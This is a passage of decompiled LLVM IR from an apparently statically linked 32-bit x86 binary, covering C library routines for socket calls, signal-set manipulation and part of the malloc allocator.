  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80527a7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80527ae = call i32 @__socketcall(i32 11, i32 %v2_80527a7)
  ret i32 %v2_80527ae

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80527e3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80527ea = call i32 @__socketcall(i32 14, i32 %v2_80527e3)
  ret i32 %v2_80527ea

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805280f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052816 = call i32 @__socketcall(i32 1, i32 %v2_805280f)
  ret i32 %v2_8052816

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 0, 8, 11, 7, 10, 9, 5, 4, 6, 2, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052838, label %dec_label_pc_805282b

dec_label_pc_805282b:                             ; preds = %entry
  %v1_805282b = add i32 %arg1, -64
  %v3_805282b = sub i32 63, %arg1
  %v4_805282b = and i32 %v3_805282b, %arg1
  %v5_805282b = icmp slt i32 %v4_805282b, 0
  %v6_805282b = icmp eq i32 %v1_805282b, 0
  %v7_805282b = icmp slt i32 %v1_805282b, 0
  %v3_805282e = icmp eq i1 %v7_805282b, %v5_805282b
  %v4_805282e = icmp eq i1 %v6_805282b, false
  %v5_805282e = and i1 %v4_805282e, %v3_805282e
  br i1 %v5_805282e, label %dec_label_pc_8052838, label %dec_label_pc_8052830

dec_label_pc_8052830:                             ; preds = %dec_label_pc_805282b
  %v4_8052833 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052838

dec_label_pc_8052838:                             ; preds = %dec_label_pc_805282b, %entry, %dec_label_pc_8052830
  %v1_8052838 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805283d = inttoptr i32 %v1_8052838 to i32*
  store i32 22, i32* %v1_805283d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805282b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052838, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052864, label %dec_label_pc_8052857

dec_label_pc_8052857:                             ; preds = %entry
  %v1_8052857 = add i32 %arg1, -64
  %v3_8052857 = sub i32 63, %arg1
  %v4_8052857 = and i32 %v3_8052857, %arg1
  %v5_8052857 = icmp slt i32 %v4_8052857, 0
  %v6_8052857 = icmp eq i32 %v1_8052857, 0
  %v7_8052857 = icmp slt i32 %v1_8052857, 0
  %v3_805285a = icmp eq i1 %v7_8052857, %v5_8052857
  %v4_805285a = icmp eq i1 %v6_8052857, false
  %v5_805285a = and i1 %v4_805285a, %v3_805285a
  br i1 %v5_805285a, label %dec_label_pc_8052864, label %dec_label_pc_805285c

dec_label_pc_805285c:                             ; preds = %dec_label_pc_8052857
  %v0_805285f = call i32 @__sigdelset()
  br label %dec_label_pc_8052864

dec_label_pc_8052864:                             ; preds = %dec_label_pc_8052857, %entry, %dec_label_pc_805285c
  %v1_8052864 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8052869 = inttoptr i32 %v1_8052864 to i32*
  store i32 22, i32* %v1_8052869, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052857, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052864, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8052886 = inttoptr i32 %arg1 to i8*
  %v4_8052886 = call i32 @__GI_memset(i8* %v3_8052886, i32 0, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80528a5 = inttoptr i32 %arg1 to i8*
  %v4_80528a5 = call i32 @__GI_memset(i8* %v3_80528a5, i32 255, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80528c8, label %dec_label_pc_80528bb

dec_label_pc_80528bb:                             ; preds = %entry
  %v1_80528bb = add i32 %arg1, -64
  %v3_80528bb = sub i32 63, %arg1
  %v4_80528bb = and i32 %v3_80528bb, %arg1
  %v5_80528bb = icmp slt i32 %v4_80528bb, 0
  %v6_80528bb = icmp eq i32 %v1_80528bb, 0
  %v7_80528bb = icmp slt i32 %v1_80528bb, 0
  %v3_80528be = icmp eq i1 %v7_80528bb, %v5_80528bb
  %v4_80528be = icmp eq i1 %v6_80528bb, false
  %v5_80528be = and i1 %v4_80528be, %v3_80528be
  br i1 %v5_80528be, label %dec_label_pc_80528c8, label %dec_label_pc_80528c0

dec_label_pc_80528c0:                             ; preds = %dec_label_pc_80528bb
  %v4_80528c3 = call i32 @__sigismember(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80528c8

dec_label_pc_80528c8:                             ; preds = %dec_label_pc_80528bb, %entry, %dec_label_pc_80528c0
  %v1_80528c8 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80528cd = inttoptr i32 %v1_80528c8 to i32*
  store i32 22, i32* %v1_80528cd, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80528bb, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80528c8, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_80528dc = load i32, i32* @ebx, align 4
  %v4_80528e0 = icmp eq i32 %tmp2, 0
  store i32 %tmp, i32* @ebx, align 4
  br i1 %v4_80528e0, label %dec_label_pc_8052905, label %dec_label_pc_80528eb

dec_label_pc_80528eb:                             ; preds = %entry
  %v1_80528ec = add i32 %tmp, 28
  %v4_80528f4 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_80528ec)
  %v1_8052901 = icmp eq i32 %v4_80528f4, 0
  br i1 %v1_8052901, label %dec_label_pc_8052907, label %dec_label_pc_8052905

dec_label_pc_8052905:                             ; preds = %dec_label_pc_80528eb, %entry
  br label %dec_label_pc_8052907

dec_label_pc_8052907:                             ; preds = %dec_label_pc_80528eb, %dec_label_pc_8052905
  %v0_8052907 = phi i32 [ 1, %dec_label_pc_80528eb ], [ 0, %dec_label_pc_8052905 ]
  %v1_8052907 = load i32, i32* @ebx, align 4
  %v2_8052907 = add i32 %v1_8052907, 24
  %v3_8052907 = inttoptr i32 %v2_8052907 to i32*
  store i32 %v0_8052907, i32* %v3_8052907, align 4
  store i32 %v0_80528dc, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8052907, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805291e = add i32 %arg2, -1
  %v1_8052921 = urem i32 %v1_805291e, 32
  %v2_8052921 = icmp eq i32 %v1_8052921, 0
  store i32 %v1_8052921, i32* @ecx, align 4
  %v2_8052924 = udiv i32 %v1_805291e, 32
  br i1 %v2_8052921, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052927 = shl i32 1, %v1_8052921
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052929 = phi i32 [ 1, %entry ], [ %v5_8052927, %bb ]
  %v2_8052929 = mul nuw nsw i32 %v2_8052924, 4
  %v3_8052929 = add i32 %v2_8052929, %arg1
  %v4_8052929 = inttoptr i32 %v3_8052929 to i32*
  %v5_8052929 = load i32, i32* %v4_8052929, align 4
  %v7_8052929 = and i32 %v5_8052929, %v6_8052929
  %v8_8052929 = icmp eq i32 %v7_8052929, 0
  %v1_805292d = icmp eq i1 %v8_8052929, false
  %v2_805292d = zext i1 %v1_805292d to i32
  ret i32 %v2_805292d

; uselistorder directives
  uselistorder i32 %v1_8052921, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052934 = load i32, i32* @ebx, align 4
  store i32 %v0_8052934, i32* %stack_var_-4, align 4
  %v1_8052942 = add i32 %arg2, -1
  %v1_8052945 = urem i32 %v1_8052942, 32
  %v2_8052945 = icmp eq i32 %v1_8052945, 0
  store i32 %v1_8052945, i32* @ecx, align 4
  br i1 %v2_8052945, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8052948 = shl i32 1, %v1_8052945
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_805294d = phi i32 [ 1, %entry ], [ %v5_8052948, %bb ]
  %v2_805294a = udiv i32 %v1_8052942, 32
  store i32 %v2_805294a, i32* @edx, align 4
  %v2_805294d = mul nuw nsw i32 %v2_805294a, 4
  %v3_805294d = add i32 %v2_805294d, %arg1
  %v4_805294d = inttoptr i32 %v3_805294d to i32*
  %v5_805294d = load i32, i32* %v4_805294d, align 4
  %v7_805294d = or i32 %v5_805294d, %v6_805294d
  store i32 %v7_805294d, i32* %v4_805294d, align 4
  %v2_8052952 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052952, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805294a, { 1, 0 }
  uselistorder i32 %v1_8052945, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052954 = load i32, i32* @ebx, align 4
  store i32 %v0_8052954, i32* %stack_var_-4, align 4
  %v1_8052962 = add i32 %tmp3, -1
  %v1_8052965 = urem i32 %v1_8052962, 32
  %v2_8052965 = icmp eq i32 %v1_8052965, 0
  br i1 %v2_8052965, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8052968 = shl i32 -2, %v1_8052965
  %v5_8052968 = sub nsw i32 32, %v1_8052965
  %v6_8052968 = lshr i32 -2, %v5_8052968
  %v7_8052968 = or i32 %v6_8052968, %v4_8052968
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_805296d = phi i32 [ -2, %entry ], [ %v7_8052968, %bb ]
  %v2_805296a = udiv i32 %v1_8052962, 32
  %v2_805296d = mul nuw nsw i32 %v2_805296a, 4
  %v3_805296d = add i32 %v2_805296d, %tmp
  %v4_805296d = inttoptr i32 %v3_805296d to i32*
  %v5_805296d = load i32, i32* %v4_805296d, align 4
  %v7_805296d = and i32 %v5_805296d, %v6_805296d
  store i32 %v7_805296d, i32* %v4_805296d, align 4
  %v2_8052972 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052972, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052965, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8052974 = load i32, i32* @eax, align 4
  %v6_8052987 = icmp ugt i32 %v0_8052974, 16777215
  br i1 %v6_8052987, label %dec_label_pc_8052998, label %dec_label_pc_8052989

dec_label_pc_8052989:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8052974, 256
  %v2_8052976 = udiv i32 %v0_8052974, 256
  %v2_8052989 = call i32 @llvm.ctlz.i32(i32 %v2_8052976, i1 true)
  %v3_8052989 = xor i32 %v2_8052989, 31
  %v5_8052989 = select i1 %tmp, i32 95, i32 %v3_8052989
  %v1_805298c = add nuw nsw i32 %v5_8052989, 6
  store i32 %v1_805298c, i32* @ecx, align 4
  %v2_805298f = urem i32 %v1_805298c, 32
  %v4_805298f = icmp eq i32 %v2_805298f, 0
  br i1 %v4_805298f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052989
  %v5_805298f = lshr i32 %v0_8052974, %v2_805298f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052989, %bb
  %v0_8052991 = phi i32 [ %v0_8052974, %dec_label_pc_8052989 ], [ %v5_805298f, %bb ]
  %v1_8052991 = urem i32 %v0_8052991, 4
  %v2_8052994 = mul nuw nsw i32 %v5_8052989, 4
  %v3_8052994 = or i32 %v1_8052991, 32
  %v4_8052994 = add nuw nsw i32 %v3_8052994, %v2_8052994
  br label %dec_label_pc_8052998

dec_label_pc_8052998:                             ; preds = %entry, %bb4
  %v0_8052999 = phi i32 [ 95, %entry ], [ %v4_8052994, %bb4 ]
  ret i32 %v0_8052999

; uselistorder directives
  uselistorder i32 %v2_805298f, { 1, 0 }
  uselistorder i32 %v0_8052974, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8052998, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805299a = load i32, i32* @ebp, align 4
  %v0_805299b = load i32, i32* @edi, align 4
  %v0_805299c = load i32, i32* @esi, align 4
  %v0_805299d = load i32, i32* @ebx, align 4
  store i32 %v0_805299d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80529af = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80529af, i32* %eax.global-to-local, align 4
  store i32 %v2_80529af, i32* %stack_var_-92, align 4
  %v4_80529b4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v4_80529b4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062cb0.166 to i32), i32* %stack_var_-92, align 4
  %v1_80529c0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v1_80529c0, i32* %eax.global-to-local, align 4
  %v0_80529c8 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80529c8, -32
  br i1 %tmp, label %dec_label_pc_80529df, label %dec_label_pc_80529cd

dec_label_pc_80529cd:                             ; preds = %entry
  %v0_80529cd = load i32, i32* %stack_var_-92, align 4
  %v1_80529cd = call i32 @__errno_location(i32 %v0_80529cd)
  store i32 %v1_80529cd, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80529d4 = inttoptr i32 %v1_80529cd to i32*
  store i32 12, i32* %v1_80529d4, align 4
  br label %dec_label_pc_8053132

dec_label_pc_80529df:                             ; preds = %entry
  %v1_80529df = add i32 %v0_80529c8, 11
  %tmp136 = icmp ult i32 %v1_80529df, 16
  br i1 %tmp136, label %dec_label_pc_80529f6, label %dec_label_pc_80529ef

dec_label_pc_80529ef:                             ; preds = %dec_label_pc_80529df
  %v1_80529ef = and i32 %v1_80529df, -8
  br label %dec_label_pc_80529f6

dec_label_pc_80529f6:                             ; preds = %dec_label_pc_80529df, %dec_label_pc_80529ef
  %storemerge133 = phi i32 [ %v1_80529ef, %dec_label_pc_80529ef ], [ %v1_80529df, %dec_label_pc_80529df ]
  %v1_8052d96 = phi i32 [ %v1_80529ef, %dec_label_pc_80529ef ], [ 16, %dec_label_pc_80529df ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_80529f6 = load i8, i8* @global_var_8067a20.234, align 1
  %v1_80529f6 = sext i8 %v0_80529f6 to i32
  store i32 %v1_80529f6, i32* @ebx, align 4
  %v3_80529fc = urem i8 %v0_80529f6, 2
  %v4_80529fc = icmp eq i8 %v3_80529fc, 0
  %v1_80529ff = icmp eq i1 %v4_80529fc, false
  br i1 %v1_80529ff, label %dec_label_pc_8052a1e, label %dec_label_pc_8052a01

dec_label_pc_8052a01:                             ; preds = %dec_label_pc_80529f6
  %v2_8052a01 = icmp eq i8 %v0_80529f6, 0
  %v1_8052a03 = icmp eq i1 %v2_8052a01, false
  br i1 %v1_8052a03, label %dec_label_pc_8052d01, label %dec_label_pc_8052a09

dec_label_pc_8052a09:                             ; preds = %dec_label_pc_8052a01
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* %stack_var_-92, align 4
  %v2_8052a11 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067a20.234 to i32*))
  store i32 %v2_8052a11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d01

dec_label_pc_8052a1e:                             ; preds = %dec_label_pc_80529f6
  %v11_8052a1e = trunc i32 %v1_8052d96 to i8
  %v8_8052a22 = icmp ugt i8 %v11_8052a1e, %v0_80529f6
  br i1 %v8_8052a22, label %dec_label_pc_8052a3f, label %dec_label_pc_8052a24

dec_label_pc_8052a24:                             ; preds = %dec_label_pc_8052a1e
  %v2_8052a28 = udiv i32 %v1_8052d96, 2
  store i32 %v2_8052a28, i32* %eax.global-to-local, align 4
  %v1_8052a2a = add i32 %v2_8052a28, ptrtoint (i8* @global_var_8067a20.234 to i32)
  store i32 %v1_8052a2a, i32* @ecx, align 4
  %v1_8052a30 = add i32 %v2_8052a28, add (i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32 -4)
  %v2_8052a30 = inttoptr i32 %v1_8052a30 to i32*
  %v3_8052a30 = load i32, i32* %v2_8052a30, align 4
  store i32 %v3_8052a30, i32* %edx.global-to-local, align 4
  %v1_8052a33 = icmp eq i32 %v3_8052a30, 0
  br i1 %v1_8052a33, label %dec_label_pc_8052a3f, label %dec_label_pc_8052a37

dec_label_pc_8052a37:                             ; preds = %dec_label_pc_8052a24
  %v1_8052a37 = add i32 %v3_8052a30, 8
  %v2_8052a37 = inttoptr i32 %v1_8052a37 to i32*
  %v3_8052a37 = load i32, i32* %v2_8052a37, align 4
  store i32 %v3_8052a37, i32* %eax.global-to-local, align 4
  store i32 %v3_8052a37, i32* %v2_8052a30, align 4
  br label %dec_label_pc_8052a78

dec_label_pc_8052a3f:                             ; preds = %dec_label_pc_8052a24, %dec_label_pc_8052a1e
  %v8_8052a3f = icmp ult i32 %v1_8052d96, 255
  %v6_8052a47 = icmp ugt i32 %v1_8052d96, 255
  store i32 %v1_8052d96, i32* @eax, align 4
  br i1 %v6_8052a47, label %dec_label_pc_8052a80, label %dec_label_pc_8052a49

dec_label_pc_8052a49:                             ; preds = %dec_label_pc_8052a3f
  %v2_8052a4d = udiv i32 %v1_8052d96, 8
  store i32 %v2_8052a4d, i32* %eax.global-to-local, align 4
  %v1_8052a50 = mul nuw i32 %v2_8052a4d, 8
  %v2_8052a50 = add i32 %v1_8052a50, ptrtoint (i32* @global_var_8067a4c.235 to i32)
  store i32 %v2_8052a50, i32* @ecx, align 4
  %v1_8052a5b = add i32 %v1_8052a50, add (i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), i32 12)
  %v2_8052a5b = inttoptr i32 %v1_8052a5b to i32*
  %v3_8052a5b = load i32, i32* %v2_8052a5b, align 4
  store i32 %v3_8052a5b, i32* %edx.global-to-local, align 4
  %v12_8052a5e = icmp eq i32 %v3_8052a5b, %v2_8052a50
  br i1 %v12_8052a5e, label %dec_label_pc_8052b7c.preheader, label %dec_label_pc_8052a66

dec_label_pc_8052a66:                             ; preds = %dec_label_pc_8052a49
  store i32 %v1_8052d96, i32* %ebx.global-to-local, align 4
  %v1_8052a6a = add i32 %v3_8052a5b, 12
  %v2_8052a6a = inttoptr i32 %v1_8052a6a to i32*
  %v3_8052a6a = load i32, i32* %v2_8052a6a, align 4
  store i32 %v3_8052a6a, i32* %eax.global-to-local, align 4
  %v2_8052a6d = or i32 %v1_8052d96, 4
  %v3_8052a6d = add i32 %v3_8052a5b, %v2_8052a6d
  %v4_8052a6d = inttoptr i32 %v3_8052a6d to i32*
  %v5_8052a6d = load i32, i32* %v4_8052a6d, align 4
  %v6_8052a6d = or i32 %v5_8052a6d, 1
  store i32 %v6_8052a6d, i32* %v4_8052a6d, align 4
  %v0_8052a72 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a72 = load i32, i32* @ecx, align 4
  %v2_8052a72 = add i32 %v1_8052a72, 12
  %v3_8052a72 = inttoptr i32 %v2_8052a72 to i32*
  store i32 %v0_8052a72, i32* %v3_8052a72, align 4
  %v0_8052a75 = load i32, i32* @ecx, align 4
  %v1_8052a75 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a75 = add i32 %v1_8052a75, 8
  %v3_8052a75 = inttoptr i32 %v2_8052a75 to i32*
  store i32 %v0_8052a75, i32* %v3_8052a75, align 4
  br label %dec_label_pc_8052a78

dec_label_pc_8052a78:                             ; preds = %dec_label_pc_8052a37, %dec_label_pc_8052a66
  %v0_8052a78 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a78 = add i32 %v0_8052a78, 8
  store i32 %v1_8052a78, i32* @ebx, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8052a80:                             ; preds = %dec_label_pc_8052a3f
  %v0_8052a84 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052a84, i32* %eax.global-to-local, align 4
  %v3_8052a89 = and i8 %v0_80529f6, 2
  %v4_8052a89 = icmp eq i8 %v3_8052a89, 0
  br i1 %v4_8052a89, label %dec_label_pc_8052b7c.preheader, label %dec_label_pc_8052a96

dec_label_pc_8052a96:                             ; preds = %dec_label_pc_8052a80
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* %stack_var_-92, align 4
  %v2_8052a9e = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067a20.234 to i32*))
  store i32 %v2_8052a9e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b7c.preheader

dec_label_pc_8052b7c.preheader:                   ; preds = %dec_label_pc_8052a96, %dec_label_pc_8052a49, %dec_label_pc_8052a80
  %stack_var_-40.0.ph = phi i32 [ %v2_8052a4d, %dec_label_pc_8052a49 ], [ %v0_8052a84, %dec_label_pc_8052a96 ], [ %v0_8052a84, %dec_label_pc_8052a80 ]
  %v1_8052ad2 = add i32 %v1_8052d96, 16
  %v0_8052b7c109 = load i32, i32* @global_var_8067a60.238, align 32
  store i32 %v0_8052b7c109, i32* @ebp, align 4
  %v9_8052b82115 = icmp eq i32 %v0_8052b7c109, 134642260
  %v1_8052b88117 = icmp eq i1 %v9_8052b82115, false
  br i1 %v1_8052b88117, label %dec_label_pc_8052aab, label %dec_label_pc_8052b8e

dec_label_pc_8052aab:                             ; preds = %dec_label_pc_8052b7c.preheader, %bb82
  %v0_8052b7c118 = phi i32 [ %v0_8052b7c, %bb82 ], [ %v0_8052b7c109, %dec_label_pc_8052b7c.preheader ]
  %v1_8052aab = add i32 %v0_8052b7c118, 4
  %v2_8052aab = inttoptr i32 %v1_8052aab to i32*
  %v3_8052aab = load i32, i32* %v2_8052aab, align 4
  %v1_8052aae = add i32 %v0_8052b7c118, 12
  %v2_8052aae = inttoptr i32 %v1_8052aae to i32*
  %v3_8052aae = load i32, i32* %v2_8052aae, align 4
  store i32 %v3_8052aae, i32* %edx.global-to-local, align 4
  %v1_8052ab1 = and i32 %v3_8052aab, -4
  store i32 %v1_8052ab1, i32* @edi, align 4
  br i1 %v6_8052a47, label %dec_label_pc_8052add, label %dec_label_pc_8052abe

dec_label_pc_8052abe:                             ; preds = %dec_label_pc_8052aab
  %v9_8052abe = icmp eq i32 %v3_8052aae, 134642260
  %v1_8052ac4 = icmp eq i1 %v9_8052abe, false
  br i1 %v1_8052ac4, label %dec_label_pc_8052add, label %dec_label_pc_8052ac6

dec_label_pc_8052ac6:                             ; preds = %dec_label_pc_8052abe
  %v1_8052ac6 = load i32, i32* @global_var_8067a50.236, align 16
  %v12_8052ac6 = icmp eq i32 %v0_8052b7c118, %v1_8052ac6
  %v1_8052acc = icmp eq i1 %v12_8052ac6, false
  br i1 %v1_8052acc, label %dec_label_pc_8052add, label %dec_label_pc_8052ace

dec_label_pc_8052ace:                             ; preds = %dec_label_pc_8052ac6
  store i32 %v1_8052ad2, i32* %eax.global-to-local, align 4
  %v6_8052ad7 = icmp ugt i32 %v1_8052ab1, %v1_8052ad2
  br i1 %v6_8052ad7, label %dec_label_pc_80530bc, label %dec_label_pc_8052add

dec_label_pc_8052add:                             ; preds = %dec_label_pc_8052ace, %dec_label_pc_8052ac6, %dec_label_pc_8052abe, %dec_label_pc_8052aab
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8052aae, i32* @global_var_8067a60.238, align 4
  %v2_8052ae5 = add i32 %v3_8052aae, 8
  %v3_8052ae5 = inttoptr i32 %v2_8052ae5 to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v3_8052ae5, align 4
  %v0_8052ae8 = load i32, i32* @edi, align 4
  %v15_8052ae8 = icmp eq i32 %v0_8052ae8, %v1_8052d96
  br i1 %v15_8052ae8, label %dec_label_pc_80530fd, label %dec_label_pc_8052af2

dec_label_pc_8052af2:                             ; preds = %dec_label_pc_8052add
  %v6_8052af8 = icmp ugt i32 %v0_8052ae8, 255
  br i1 %v6_8052af8, label %dec_label_pc_8052b0b, label %dec_label_pc_8052afa

dec_label_pc_8052afa:                             ; preds = %dec_label_pc_8052af2
  %v2_8052afc = udiv i32 %v0_8052ae8, 8
  store i32 %v2_8052afc, i32* %esi.global-to-local, align 4
  %v1_8052aff = mul nuw i32 %v2_8052afc, 8
  %v2_8052aff = add i32 %v1_8052aff, 134642252
  store i32 %v2_8052aff, i32* @ebx, align 4
  %v1_8052b06 = add i32 %v1_8052aff, 134642260
  %v2_8052b06 = inttoptr i32 %v1_8052b06 to i32*
  %v3_8052b06 = load i32, i32* %v2_8052b06, align 4
  store i32 %v3_8052b06, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b54

dec_label_pc_8052b0b:                             ; preds = %dec_label_pc_8052af2
  store i32 %v0_8052ae8, i32* @eax, align 4
  %v0_8052b0d = call i32 @__malloc_largebin_index()
  store i32 %v0_8052b0d, i32* %esi.global-to-local, align 4
  %v1_8052b14 = mul i32 %v0_8052b0d, 8
  %v2_8052b14 = add i32 %v1_8052b14, ptrtoint (i32* @global_var_8067a4c.235 to i32)
  store i32 %v2_8052b14, i32* %eax.global-to-local, align 4
  %v1_8052b1b = add i32 %v1_8052b14, add (i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), i32 8)
  %v2_8052b1b = inttoptr i32 %v1_8052b1b to i32*
  %v3_8052b1b = load i32, i32* %v2_8052b1b, align 4
  store i32 %v3_8052b1b, i32* %edx.global-to-local, align 4
  %v12_8052b1e = icmp eq i32 %v3_8052b1b, %v2_8052b14
  store i32 %v3_8052b1b, i32* @ebx, align 4
  br i1 %v12_8052b1e, label %dec_label_pc_8052b54, label %dec_label_pc_8052b28

dec_label_pc_8052b28:                             ; preds = %dec_label_pc_8052b0b
  %v1_8052b28 = add i32 %v1_8052b14, add (i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), i32 12)
  %v2_8052b28 = inttoptr i32 %v1_8052b28 to i32*
  %v3_8052b28 = load i32, i32* %v2_8052b28, align 4
  store i32 %v3_8052b28, i32* @ebx, align 4
  %v0_8052b2b = load i32, i32* @edi, align 4
  %v2_8052b2b = add i32 %v3_8052b28, 4
  %v3_8052b2b = inttoptr i32 %v2_8052b2b to i32*
  %v4_8052b2b = load i32, i32* %v3_8052b2b, align 4
  %v10_8052b2b = icmp ult i32 %v0_8052b2b, %v4_8052b2b
  %v1_8052b2e = icmp eq i1 %v10_8052b2b, false
  br i1 %v1_8052b2e, label %dec_label_pc_8052b36, label %dec_label_pc_8052b54

dec_label_pc_8052b36:                             ; preds = %dec_label_pc_8052b28
  %v1_8052b38 = or i32 %v0_8052b2b, 1
  store i32 %v1_8052b38, i32* %eax.global-to-local, align 4
  store i32 %v3_8052b1b, i32* %ebx.global-to-local, align 4
  %v2_8052b4c101 = add i32 %v3_8052b1b, 4
  %v3_8052b4c102 = inttoptr i32 %v2_8052b4c101 to i32*
  %v4_8052b4c103 = load i32, i32* %v3_8052b4c102, align 4
  %v10_8052b4c105 = icmp ult i32 %v1_8052b38, %v4_8052b4c103
  br i1 %v10_8052b4c105, label %dec_label_pc_8052b3d, label %dec_label_pc_8052b51

